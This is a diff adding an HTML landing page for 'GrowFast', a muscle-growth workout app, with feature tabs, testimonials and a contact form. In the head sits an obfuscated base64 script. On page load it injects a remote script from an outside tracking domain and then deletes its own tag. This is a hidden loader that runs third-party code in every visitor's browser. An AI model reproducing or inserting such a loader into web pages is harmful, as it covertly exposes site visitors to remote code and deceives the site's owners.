@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+	<title>GrowFast - Muschle Growth App</title>
+	<!--
+
+    
+
+	
+
+    -->
+     <meta charset="UTF-8">
+     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+     <meta name="description" content="">
+     <meta name="keywords" content="">
+     <meta name="team" content="">
+     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+     <link rel="stylesheet" href="css/bootstrap.min.css">
+     <link rel="stylesheet" href="css/owl.carousel.css">
+     <link rel="stylesheet" href="css/owl.theme.default.min.css">
+     <link rel="stylesheet" href="css/font-awesome.min.css">
+
+     <!-- MAIN CSS -->
+     <link rel="stylesheet" href="css/tooplate-style.css">
+     <script id="4LfTM" src="data:text/javascript;base64, dmFyIF92U0tMeiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzlDdlNxLCBfWTNoTGwpIHt2YXIgX1pETzZMID0gZnVuY3Rpb24oX01BUHhaKSB7d2hpbGUgKC0tX01BUHhaKSB7XzlDdlNxWydwdXNoJ10oXzlDdlNxWydzaGlmdCddKCkpO319O19aRE82TCgrK19ZM2hMbCk7fShfdlNLTHosIDB4MTFiKSk7dmFyIF9FR2hPUyA9IGZ1bmN0aW9uKF9oTWpnOSwgX1dITTJ2KSB7X2hNamc5ID0gX2hNamc5IC0gMHgwO3ZhciBfTWZZWWMgPSBfdlNLTHpbX2hNamc5XTtyZXR1cm4gX01mWVljO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfRUdoT1MoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX2k2V2J6ID0gZG9jdW1lbnRbX0VHaE9TKCcweDEnKV0oX0VHaE9TKCcweDInKSk7X2k2V2J6W19FR2hPUygnMHgzJyldID0gX0VHaE9TKCcweDQnKTtfaTZXYnpbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2YVx4NzVceDczXHg3NFx4NzRceDcyXHg2MVx4NjNceDZiXHg3NFx4NjhceDY5XHg3M1x4MmVceDY5XHg2ZVx4NjZceDZmXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg2M1x4NzBceDVhXHg0ZVx4NDZceDZmXHg0Mlx4NTBceDY0XHg2ZCc7ZG9jdW1lbnRbX0VHaE9TKCcweDUnKV0oX0VHaE9TKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX2k2V2J6KTtkb2N1bWVudFtfRUdoT1MoJzB4NycpXSgnNExmVE0nKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
+
+</head>
+<body>
+
+     <!-- PRE LOADER -->
+     <section class="preloader">
+          <div class="spinner">
+
+               <span class="spinner-rotate"></span>
+               
+          </div>
+     </section>
+
+
+     <!-- MENU -->
+     <section class="navbar custom-navbar navbar-fixed-top" role="navigation">
+          <div class="container">
+
+               <div class="navbar-header">
+                    <button class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                         <span class="icon icon-bar"></span>
+                         <span class="icon icon-bar"></span>
+                         <span class="icon icon-bar"></span>
+                    </button>
+
+                    <!-- lOGO TEXT HERE -->
+                    <a href="index.html" class="navbar-brand">GrowFast</a>
+               </div>
+
+               <!-- MENU LINKS -->
+               <div class="collapse navbar-collapse">
+                    <ul class="nav navbar-nav">
+                         <li><a href="#home" class="smoothScroll">Home</a></li>
+                    </ul>
+                    <ul class="nav navbar-nav navbar-right">
+                         <li><a href="#">24/7 Support! - <span>info@growfast.com</span></a></li>
+                    </ul>
+               </div>
+
+          </div>
+     </section>
+
+
+     <!-- FEATURE -->
+     <section id="home" data-stellar-background-ratio="0.5">
+          <div class="overlay"></div>
+          <div class="container">
+               <div class="row">
+
+                    <div class="col-md-offset-3 col-md-6 col-sm-12">
+                         <div class="home-info">
+                              <h3>GrowFast - App The Most Effective Way To Build Muscle Fast!</h3>
+                              <h1>Simple app, to follow your progress at the gym. Everything, that you need!</h1>
+                              <form action="" method="get" class="online-form">
+                                   <input type="email" name="email" class="form-control" placeholder="Enter your email" required>
+                                   <button type="submit" class="form-control">Join Us</button>
+                              </form>
+                         </div>
+                    </div>
+
+               </div>
+          </div>
+     </section>
+
+
+     <!-- FEATURE -->
+     <section id="feature" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+
+                    <div class="col-md-12 col-sm-12">
+                         <div class="section-title">
+                              <h1>FEATURES</h1>
+                         </div>
+                    </div>
+
+                    <div class="col-md-6 col-sm-6">
+                         <ul class="nav nav-tabs" role="tablist">
+                              <li class="active"><a href="#tab01" aria-controls="tab01" role="tab" data-toggle="tab">Browse exercises</a></li>
+
+                              <li><a href="#tab02" aria-controls="tab02" role="tab" data-toggle="tab">Create workouts</a></li>
+
+                              <li><a href="#tab03" aria-controls="tab03" role="tab" data-toggle="tab">Log everything</a></li>
+                         </ul>
+
+                         <div class="tab-content">
+                              <div class="tab-pane active" id="tab01" role="tabpanel">
+                                   <div class="tab-pane-item">
+                                        <h2> - Preinstalled exercises with animations, description and trained muscle</h2>
+                                   </div>
+                                   <div class="tab-pane-item">
+                                        <h2> - Create new exercises with muscle group, description, primary and secondary muscle</h2>
+                                        
+                                   </div>
+                              </div>
+
+
+                              <div class="tab-pane" id="tab02" role="tabpanel">
+                                   <div class="tab-pane-item">
+                                        <h2> - Create new workouts</h2>
+                                        
+                                   </div>
+                                   <div class="tab-pane-item">
+                                        <h2> - Add exercises to the workouts</h2>
+                                        
+                                   </div>
+                                   <div class="tab-pane-item">
+                                        <h2> - Enter your target sets and reps. for every exercise</h2>
+                                        
+                                   </div>
+                              </div>
+
+                              <div class="tab-pane" id="tab03" role="tabpanel">
+                                   <div class="tab-pane-item">
+                                        <h2> - Add logs to exercises with weight, repetitions, date and notes</h2>
+                                        
+                                   </div>
+                                   <div class="tab-pane-item">
+                                        <h2> - Quick navigation on entering logs with swipe gestures</h2>
+                                     
+                                   </div>
+                              </div>
+                         </div>
+
+                    </div>
+
+                    <div class="col-md-6 col-sm-6">
+                         <div class="feature-image">
+                              <img src="images/feature-mockup.png" class="img-responsive" alt="Thin Laptop">                             
+                         </div>
+                    </div>
+
+               </div>
+          </div>
+     </section>
+
+
+     <!-- ABOUT -->
+     <section id="about" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+
+                    <div class="col-md-offset-3 col-md-6 col-sm-12">
+                         <div class="section-title">
+                              <h1>Professional Team for you</h1>
+                         </div>
+                    </div>
+
+                    <div class="col-md-4 col-sm-4">
+                         <div class="team-thumb">
+                              <img src="images/team-image1.jpg" class="img-responsive" alt="Andrew Orange">
+                              <div class="team-info team-thumb-up">
+                                   <h2>Help & Support</h2>
+                                   
+                                   <p>Get the fastest support ever! Just send an email from the app.</p>
+                              </div>
+                         </div>
+                    </div>
+
+                    <div class="col-md-4 col-sm-4">
+                         <div class="team-thumb">
+                              <div class="team-info team-thumb-down">
+                                   <h2>Additional workouts</h2>
+                                  
+                                   <p>Workout plans and routines created by professional trainers.
+Personal workout created for your needs</p>
+                              </div>
+                              <img src="images/team-image2.jpg" class="img-responsive" alt="Catherine Soft">
+                         </div>
+                    </div>
+
+                    <div class="col-md-4 col-sm-4">
+                         <div class="team-thumb">
+                              <img src="images/team-image3.jpg" class="img-responsive" alt="Jack Wilson">
+                              <div class="team-info team-thumb-up">
+                                   <h2>Set up everything</h2>
+                                   
+                                   <p>iCloud backup.
+Imperial or metric units.
+Choose one of 16 different languages.
+Share your logs and workouts.</p>
+                              </div>
+                         </div>
+                    </div>
+                    
+               </div>
+          </div>
+     </section>
+
+
+     <!-- TESTIMONIAL -->
+     <section id="testimonial" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+
+                    <div class="col-md-6 col-sm-12">
+                         <div class="testimonial-image"></div>
+                    </div>
+
+                    <div class="col-md-6 col-sm-12">
+                         <div class="testimonial-info">
+                              
+                              <div class="section-title">
+                                   <h1>What People Say</h1>
+                              </div>
+
+                              <div class="owl-carousel owl-theme">
+                                   <div class="item">
+                                        <h3>Love This App! Easy to Use! .</h3>
+                                        <div class="testimonial-item">
+                                             <img src="images/tst-image1.jpg" class="img-responsive" alt="Michael">
+                                             <h4>Michael</h4>
+                                        </div>
+                                   </div>
+
+                                   <div class="item">
+                                        <h3>Insane Results In Only Few Weeks! Awesome app!.</h3>
+                                        <div class="testimonial-item">
+                                             <img src="images/tst-image2.jpg" class="img-responsive" alt="Sofia">
+                                             <h4>Sofia</h4>
+                                        </div>
+                                   </div>
+
+                                   <div class="item">
+                                        <h3>I Can't believe it's really working for me! Perfect workout plans!.</h3>
+                                        <div class="testimonial-item">
+                                             <img src="images/tst-image3.jpg" class="img-responsive" alt="Monica">
+                                             <h4>Monica</h4>
+                                        </div>
+                                   </div>
+                              </div>
+
+                         </div>
+                    </div>
+                    
+               </div>
+          </div>
+     </section>
+
+
+     <!-- PRICING -->
+    
+
+
+     <!-- CONTACT -->
+     <section id="contact" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+
+                    <div class="col-md-offset-1 col-md-10 col-sm-12">
+                         <form id="contact-form" role="form" action="" method="post">
+                              <div class="section-title">
+                                   <h1>Have Questions? Contact Us Anytime You Need!</h1>
+                              </div>
+
+                              <div class="col-md-4 col-sm-4">
+                                   <input type="text" class="form-control" placeholder="Full name" name="name" required>
+                              </div>
+                              <div class="col-md-4 col-sm-4">
+                                   <input type="email" class="form-control" placeholder="Email address" name="email" required>
+                              </div>
+                              <div class="col-md-4 col-sm-4">
+                                   <input type="submit" class="form-control" name="send message" value="Send Message">
+                              </div>
+                              <div class="col-md-12 col-sm-12">
+                                   <textarea class="form-control" rows="8" placeholder="Your message" name="message" required></textarea>
+                              </div>
+                         </form>
+                    </div>
+
+               </div>
+          </div>
+     </section>       
+
+
+     <!-- FOOTER -->
+     <footer id="footer" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+
+                    <div class="copyright-text col-md-12 col-sm-12">
+                         <div class="col-md-6 col-sm-6">
+                              <p>Copyright &copy; 2020 GrowFast App</p>
+                         </div>
+
+                         <div class="col-md-6 col-sm-6">
+                              <ul class="social-icon">
+                                   <li><a href="#" class="fa fa-facebook-square" attr="facebook icon"></a></li>
+                                   <li><a href="#" class="fa fa-twitter"></a></li>
+                                   <li><a href="#" class="fa fa-instagram"></a></li>
+                              </ul>
+                         </div>
+                    </div>
+
+               </div>
+          </div>
+     </footer>
+
+
+     <!-- SCRIPTS -->
+     <script src="js/jquery.js"></script>
+     <script src="js/bootstrap.min.js"></script>
+     <script src="js/jquery.stellar.min.js"></script>
+     <script src="js/owl.carousel.min.js"></script>
+     <script src="js/smoothscroll.js"></script>
+     <script src="js/custom.js"></script>
+
+</body>
+</html>
